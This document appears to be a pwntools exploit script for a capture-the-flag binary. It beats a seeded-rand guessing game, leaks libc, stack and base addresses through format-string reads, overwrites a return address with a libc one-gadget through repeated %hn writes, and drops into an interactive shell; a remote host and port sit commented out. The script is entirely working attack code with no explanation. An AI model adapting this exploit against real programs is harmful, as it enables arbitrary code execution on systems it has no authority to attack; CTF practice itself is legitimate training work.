from pwn import * 
from ctypes import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p= process('/home/hacker/Desktop/harde_pwn')
#p = remote("47.108.165.60",30333)
libc = cdll.LoadLibrary('/home/hacker/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc-2.27.so' )
libc_start_main_offset = 138144
gadget_offset = 0x4f302
#libc_start_main_offset = 171456
#gadget_offset = 0xebcf5
ret_offset = 0x000000000000101a

payload = b'A'*0x1c+b'\x00'*4
p.recvuntil("Welcome to a ctype game!")
p.send(payload)

libc.srand(0)
for i in range(21):
    p.recvuntil("input:")
    num=(libc.rand()^0x24)+1
    p.sendline(str(num))

#leak libc
pause()
payload = '%11$p'
p.sendline(payload)
p.recvuntil('input your data ;)\n')
libc = int(p.recv(14),16) - libc_start_main_offset - 231
print("libc_start_main:",hex(libc))

gadget = libc + gadget_offset


#leak stack 
payload = '%8$p'
p.sendline(payload)
p.recvuntil('input your data ;)\n')
stack = int(p.recv(14),16)
print("stack:",hex(stack))
print("we need write to :",hex(stack-40))

#leak heap
payload = '%9$p' 
p.sendline(payload)
p.recvuntil('input your data ;)\n')
base = int(p.recv(14),16) - 5443
print("base:",hex(base))

ret = base + ret_offset
p.recvuntil('input your data ;)\n')

#gdb.attach(p)
#pause()
pause()
print("stack:",hex(stack))
a = (stack - 32)&0xffff - 2
print("a:",hex(a))
payload = '%' +str(a)+ 'c%13$hn\x00'
p.sendline(payload)



p.recvuntil('input your data ;)\n')

pause()
b = (gadget)&0xffff
print("b:",hex(b))
payload = '%' + str(b) + 'c%39$hn\x00'
p.sendline(payload)

p.recvuntil('input your data ;)\n')

a1 = (stack - 32 + 2)&0xffff
print("a1:",hex(a1))
payload = '%' + str(a1) + 'c%13$hn\x00'
p.send(payload)
p.recvuntil('input your data ;)\n')

pause()
b1 = ((gadget)>>16)&0xffff
print("b1:",hex(b1))
payload = '%' +str(b1) + 'c%39$hn\x00'
p.send(payload)
p.recvuntil('input your data ;)\n')

pause()
a2 = (stack - 32 + 4)&0xffff
print("a2:",hex(a1))
payload = '%' + str(a2) + 'c%13$hn\x00'
p.send(payload)
p.recvuntil('input your data ;)\n')

pause()
b2 = ((gadget)>>32)&0xffff
print("b2:",hex(b2))
payload = '%' +str(b2) +  'c%39$hn\x00'
p.send(payload)
p.recvuntil('input your data ;)\n')


pause()
a = (stack - 40)&0xffff - 2
print("a:",hex(a))
payload = '%' + str(a) + 'c%13$hn\x00'
p.send(payload)
p.recvuntil('input your data ;)\n')

pause()
b = (ret)&0xffff
print("b:",hex(b))
payload = '%' + str(b) + 'c%39$hn\x00'
p.send(payload)

p.interactive()



